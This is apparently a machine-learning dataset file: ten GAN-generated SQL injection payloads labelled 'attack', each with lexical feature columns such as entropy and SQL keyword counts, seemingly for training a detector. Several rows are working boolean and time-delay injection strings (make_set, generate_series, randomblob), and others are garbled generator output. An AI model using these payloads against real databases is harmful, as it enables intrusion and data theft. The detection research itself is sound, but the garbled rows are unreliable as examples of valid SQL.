label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,14889%%%'  )   and 3202  =  like  (  'fa,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,0,40.0,21.0,3.6704816846131143,9.0,9.0,14.0,8.0,0.225,0.225,0.35,0.2,2.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%%""  )   or make_set  (  9539  =  9519,9519  )   and   (  "" %'  )   and make_set  (  4551  =  6487,6487  )   and   (  '   )zg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,1,126.0,29.0,3.693302845883821,27.0,25.0,52.0,22.0,0.21428571428571427,0.1984126984126984,0.4126984126984127,0.1746031746031746,2.0,2.0,0.0,0.0,0.0,2.0,0.0,9.0,3.0,2.0,2.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'||  (  select 'qfromaw a"" like ""uma_' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,2,155.0,39.0,4.158417714857478,58.0,21.0,53.0,23.0,0.3741935483870968,0.13548387096774195,0.3419354838709677,0.14838709677419354,4.0,2.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,2.0,1.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1t  select   and  3455  dbfrom 2223  =     *,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,3,44.0,21.0,3.5448462594686783,16.0,9.0,17.0,2.0,0.36363636363636365,0.20454545454545456,0.38636363636363635,0.045454545454545456,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1if cou)   ajnda,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,4,16.0,12.0,3.375,10.0,1.0,4.0,1.0,0.625,0.0625,0.25,0.0625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,e=  (  =    (  * or(   3202  =  ),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,5,33.0,11.0,2.4211085123800125,3.0,4.0,18.0,8.0,0.09090909090909091,0.12121212121212122,0.5454545454545454,0.24242424242424243,0.0,0.0,0.0,0.0,1.0,3.0,0.0,4.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,6,276.0,32.0,3.384786191133037,70.0,29.0,132.0,45.0,0.2536231884057971,0.10507246376811594,0.4782608695652174,0.16304347826086957,4.0,6.0,0.0,2.0,0.0,3.0,0.0,24.0,4.0,0.0,2.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,=  m   7427 f   =    (   b  =(  (,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,7,33.0,9.0,2.0762626980834784,3.0,4.0,20.0,6.0,0.09090909090909091,0.12121212121212122,0.6060606060606061,0.18181818181818182,0.0,0.0,0.0,0.0,0.0,3.0,0.0,3.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%%'  =  ''  =  '%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,8,18.0,5.0,2.016875695766564,0.0,1.0,8.0,9.0,0.0,0.05555555555555555,0.4444444444444444,0.5,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,select makzre' like 't  c  =  =  select c,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,9,41.0,14.0,3.30781785785448,25.0,0.0,12.0,4.0,0.6097560975609756,0.0,0.2926829268292683,0.0975609756097561,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
